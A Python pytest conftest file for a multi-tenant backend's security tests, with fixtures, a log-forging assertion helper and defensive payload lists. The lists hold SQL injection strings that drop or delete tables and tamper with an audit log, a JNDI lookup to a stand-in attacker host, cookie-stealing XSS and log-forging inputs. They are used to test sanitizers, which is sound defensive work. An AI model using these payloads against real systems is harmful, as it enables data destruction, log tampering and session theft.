"""backend/tests/security/conftest.py

Role: Fixtures for the security suite, plus the hostile payload sets and the log assertion
helper that only these tests need.

The two-tenant application stack itself lives in `backend/tests/harness.py`, not here. It is
shared with `backend/tests/regression/`, and a regression suite importing fixtures out of the
security package would invert the dependency — deleting a security test could then break a
business-requirement test. So this file is thin: two fixtures over `build_stack()` and
`build_api()`, and the payload corpora below.

The names moved to the harness are re-exported so every module in this package keeps its
existing absolute import (`from backend.tests.security.conftest import API, Stack, ...`)
working. `__all__` is what tells ruff those re-exports are intentional rather than unused.
"""

from __future__ import annotations

from collections.abc import AsyncIterator

import pytest

from backend.tests.harness import (
    API,
    CONTEXT,
    ROOT,
    SHARED_QUESTION,
    TENANT_A_PASSAGES,
    TENANT_B_PASSAGES,
    Api,
    Stack,
    Tenant,
    backend_modules,
    build_api,
    build_stack,
    csrf_headers,
    make_user,
)

__all__ = [
    "API",
    "CONTEXT",
    "INJECTION_PAYLOADS",
    "LOG_INJECTION_PAYLOADS",
    "ROOT",
    "SHARED_QUESTION",
    "TENANT_A_PASSAGES",
    "TENANT_B_PASSAGES",
    "XSS_PAYLOADS",
    "Api",
    "Stack",
    "Tenant",
    "assert_no_forged_line",
    "backend_modules",
    "csrf_headers",
    "make_user",
]


@pytest.fixture
async def stack() -> Stack:
    """Two populated tenants over the fakes. The starting point for every test here."""
    return await build_stack()


@pytest.fixture
async def api(stack: Stack) -> AsyncIterator[Api]:
    """The real app over `stack`, plus an `as_user` switch. See `harness.build_api`."""
    async with build_api(stack) as client_and_switch:
        yield client_and_switch


#: Payload set reused across the injection modules. One list, so a payload added for SQL is
#: also tried against the log sanitizer, the keyword filter and the document-name filter — the
#: places a string travels to are not obvious from where it enters.
INJECTION_PAYLOADS: tuple[str, ...] = (
    "' OR '1'='1",
    "'; DROP TABLE document; --",
    "1' UNION SELECT null, integrity_hash FROM audit_log --",
    "admin'--",
    "\" OR 1=1 --",
    "%' OR name LIKE '%",
    "'; UPDATE audit_log SET action='LOGIN' WHERE 1=1; --",
    "\\'; DELETE FROM document_chunk; --",
    "0x27 OR 1=1",
    "' AND pg_sleep(5) --",
    "${jndi:ldap://attacker.invalid/a}",
    "{{7*7}}",
)

#: Cross-site scripting payloads, including the ones that survive a naive tag strip.
XSS_PAYLOADS: tuple[str, ...] = (
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src='javascript:alert(1)'></iframe>",
    "\"><script>alert(document.cookie)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<body onload=alert(1)>",
    "<a href=\"javas&#99;ript:alert(1)\">x</a>",
)

#: Log-forging payloads. Each one tries to make a single field look like a second log line or a
#: second JSON object.
LOG_INJECTION_PAYLOADS: tuple[str, ...] = (
    "benign\r\nERROR fabricated.event user=root",
    "benign\nWARNING login.success email=attacker@evil.invalid",
    'benign","level":"critical","event":"fabricated',
    "benign\x00truncated",
    "benign\x1b[31mred\x1b[0m",
    "benign\x7fdelete",
    # U+2028 LINE SEPARATOR: not a newline to Python's `str.splitlines()`-free checks, but a
    # line break to a JSON consumer and to most log viewers. The one payload here that a
    # CR/LF-only sanitizer lets straight through.
    "benign line-separator",
    "%s%s%s%n",
    "benign\r\n\r\n{\"event\":\"audit.tampered\"}",
)


def assert_no_forged_line(rendered: str) -> None:
    """A rendered log line must be exactly one line with no raw control characters.

    Both halves matter. The line count is what a log parser sees; the control-character check
    is what an operator's terminal sees — an ANSI escape or a DEL cannot forge a record but can
    hide one from a human reading `docker logs`.
    """
    assert "\n" not in rendered, f"log value spans lines: {rendered!r}"
    assert "\r" not in rendered, f"log value carries a CR: {rendered!r}"
    forbidden = [char for char in rendered if ord(char) < 0x20 or 0x7F <= ord(char) <= 0x9F]
    assert not forbidden, f"log value carries control characters {forbidden!r}: {rendered!r}"
